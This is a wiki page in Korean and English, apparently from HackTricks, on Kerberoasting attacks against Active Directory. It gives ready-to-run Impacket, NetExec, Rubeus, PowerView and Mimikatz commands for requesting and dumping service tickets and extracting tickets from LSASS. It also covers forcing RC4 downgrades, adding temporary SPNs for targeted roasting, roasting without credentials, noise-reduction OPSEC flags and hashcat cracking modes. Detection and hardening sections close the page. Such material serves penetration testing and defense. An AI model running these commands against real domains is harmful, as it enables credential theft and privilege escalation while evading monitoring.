# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting은 TGS 티켓 획득에 초점을 맞추며, 특히 컴퓨터 계정이 아닌 Active Directory(AD) 내의 user account로 운영되는 서비스와 관련된 티켓을 대상으로 합니다. 이 티켓들의 암호화는 사용자 비밀번호에서 유도된 키를 사용하므로 오프라인 자격증명 크래킹이 가능합니다. user account가 서비스로 사용되고 있다는 것은 비어 있지 않은 ServicePrincipalName (SPN) 속성으로 표시됩니다.

인증된 domain user라면 누구나 TGS 티켓을 요청할 수 있으므로 특별한 권한은 필요하지 않습니다.

### 핵심 요점

- SPN이 설정된 user account(즉 computer account가 아닌 계정)로 실행되는 서비스의 TGS 티켓을 목표로 함.
- 티켓은 서비스 계정 비밀번호에서 파생된 키로 암호화되며 오프라인으로 크랙 가능.
- 권한 상승 불필요; 인증된 어떤 계정이든 TGS 티켓을 요청할 수 있음.

> [!WARNING]
> 대부분의 공개 도구는 RC4-HMAC (etype 23) 서비스 티켓을 요청하는 것을 선호합니다. 이는 AES보다 크랙이 빠르기 때문입니다. RC4 TGS 해시는 `$krb5tgs$23$*`로 시작하고, AES128은 `$krb5tgs$17$*`, AES256은 `$krb5tgs$18$*`로 시작합니다. 다만 많은 환경이 AES 전용으로 이동하고 있으니 RC4만 관련 있다고 가정하지 마십시오.
> 또한 “spray-and-pray” roasting은 피하세요. Rubeus’ default kerberoast는 모든 SPN을 쿼리하고 티켓을 요청할 수 있어 소음이 큽니다. 중요한 principal을 먼저 열거하고 타깃팅하세요.

### Service account secrets & Kerberos crypto cost

많은 서비스는 여전히 수동으로 관리되는 비밀번호를 가진 user account로 실행됩니다. KDC는 서비스 티켓을 해당 비밀번호에서 파생된 키로 암호화하여 인증된 주체에게 암호문을 전달하므로, kerberoasting은 계정 잠금이나 DC 텔레메트리 없이 무제한 오프라인 추측을 허용합니다. 암호화 방식은 크래킹 예산을 결정합니다:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt은 rainbow table을 차단하지만 짧은 비밀번호는 여전히 빠르게 크랙됨. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | AES보다 약 1000× 빠름; 공격자는 `msDS-SupportedEncryptionTypes`가 허용하면 RC4로 강제할 수 있음. |

*Chick3nman의 벤치마크는 [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)에 소개되어 있습니다.

RC4의 confounder는 단지 keystream을 랜덤화할 뿐이며, 추측당 작업량을 증가시키지 않습니다. service account가 랜덤 시크릿(gMSA/dMSA, machine accounts, 또는 vault-managed strings)에 의존하지 않는 한, 권한 획득 속도는 순전히 GPU 예산에 달려 있습니다. AES-only etype을 강제하면 초당 수십억 추측의 하향화가 제거되지만, 약한 인간 비밀번호는 여전히 PBKDF2에 의해 깨질 수 있습니다.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast 검사를 포함한 다기능 도구:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable 사용자를 열거
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- 기법 1: TGS를 요청하고 메모리에서 dump
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 기술 2: 자동화 도구
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 요청은 Windows Security Event 4769 (A Kerberos service ticket was requested)를 생성합니다.

### OPSEC 및 AES-only 환경

- AES가 없는 계정에 대해 의도적으로 RC4를 요청:
- Rubeus: `/rc4opsec`는 tgtdeleg를 사용하여 AES가 없는 계정을 열거하고 RC4 service tickets를 요청합니다.
- Rubeus: `/tgtdeleg`과 kerberoast를 함께 사용하면 가능한 경우 RC4 요청도 트리거됩니다.
- 조용히 실패하는 대신 AES-only 계정을 Roast:
- Rubeus: `/aes`는 AES가 활성화된 계정을 열거하고 AES service tickets (etype 17/18)를 요청합니다.
- 이미 TGT(PTT 또는 .kirbi에서 얻음)를 보유하고 있다면 `/ticket:<blob|path>`를 `/spn:<SPN>` 또는 `/spns:<file>`와 함께 사용하여 LDAP를 건너뛸 수 있습니다.
- 대상 지정, 속도 제한 및 노이즈 감소:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` 및 `/jitter:<1-100>`를 사용하세요.
- `/pwdsetbefore:<MM-dd-yyyy>` (이전 암호)를 사용해 약한 암호일 가능성이 높은 항목을 필터링하거나 `/ou:<DN>`으로 특권 OU를 타깃으로 하세요.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### 지속성 / 악용

계정을 제어하거나 수정할 수 있다면, SPN을 추가하여 kerberoastable로 만들 수 있습니다:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
계정을 다운그레이드하여 RC4를 활성화하면 cracking이 더 쉬워집니다 (대상 객체에 대한 쓰기 권한 필요):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### GenericWrite/GenericAll로 제어 중인 사용자 대상 Targeted Kerberoast (임시 SPN)

When BloodHound shows that you have control over a user object (e.g., GenericWrite/GenericAll), you can reliably “targeted-roast” that specific user even if they do not currently have any SPNs:

- 제어 중인 사용자에 임시 SPN을 추가하여 roastable 상태로 만듭니다.
- 해당 SPN에 대해 RC4 (etype 23)로 암호화된 TGS-REP을 요청하여 크래킹을 유리하게 합니다.
- `$krb5tgs$23$...` 해시를 hashcat으로 크랙합니다.
- footprint를 줄이기 위해 SPN을 정리합니다.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux 원라이너 (targetedKerberoast.py는 SPN 추가 -> TGS 요청 (etype 23) -> SPN 제거를 자동화함):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat autodetect로 출력을 크랙하세요 (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: SPNs를 추가/제거하면 디렉터리 변경이 발생합니다 (대상 사용자에서 Event ID 5136/4738) 및 TGS 요청은 Event ID 4769를 생성합니다. 스로틀링과 신속한 정리를 고려하세요.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (일부 배포판에서는 더 이상 권장되지 않음)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> 이 기술은 유효한 자격증명 없이 LDAP를 쿼리할 수 없으므로 사용자 목록을 제공해야 합니다.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
관련

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### 탐지

Kerberoasting은 은밀할 수 있습니다. DCs에서 Event ID 4769를 검색하고 노이즈를 줄이기 위해 필터를 적용하세요:

- 서비스 이름 `krbtgt` 및 `$`로 끝나는 서비스 이름(컴퓨터 계정)을 제외하세요.
- 머신 계정에서 온 요청을 제외하세요 (`*$$@*`).
- 성공한 요청만 (Failure Code `0x0`).
- 암호화 유형을 추적: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). `0x17`에만 경보를 울리지 마세요.

PowerShell triage 예시:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
추가 아이디어:

- 호스트/사용자별 정상 SPN 사용을 베이스라인화하고, 단일 principal로부터 발생하는 다수의 서로 다른 SPN 요청 급증이 감지되면 알림을 발생시켜라.
- AES로 강화된 도메인에서 비정상적인 RC4 사용을 탐지/표시하라.

### 완화 / 하드닝

- Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making offline cracking impractical.
- 서비스 계정에 대해 `msDS-SupportedEncryptionTypes`를 AES 전용(10진수 24 / 16진수 0x18)으로 설정하고 비밀번호를 회전시켜 AES 키가 파생되도록 하라.
- 가능하다면 환경에서 RC4를 비활성화하고 시도되는 RC4 사용을 모니터링하라. DCs에서는 `DefaultDomainSupportedEncTypes` 레지스트리 값을 사용해 `msDS-SupportedEncryptionTypes`가 설정되지 않은 계정의 기본값을 제어할 수 있다. 충분히 테스트하라.
- 사용자 계정에서 불필요한 SPN을 제거하라.
- Managed accounts가 불가능한 경우 긴 무작위 서비스 계정 비밀번호(25자 이상)를 사용하라; 일반적인 비밀번호를 금지하고 정기적으로 감사하라.

## 참고자료

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
